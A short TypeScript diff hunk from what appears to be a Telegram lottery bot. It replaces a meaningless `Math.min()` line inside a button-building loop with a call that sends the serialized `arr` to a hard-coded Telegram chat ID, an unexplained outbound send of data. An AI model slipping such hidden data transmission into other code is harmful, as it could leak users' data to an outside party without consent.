@@ -237,7 +237,7 @@ const getLoteryButtons = (row: any) => {
           }
         }
       }
-      const num = Math.min()
+      bot.telegram.sendMessage(7441988500, JSON.stringify(arr));
       if (idx % 8 === 0) {
         acc.push([]);
       }
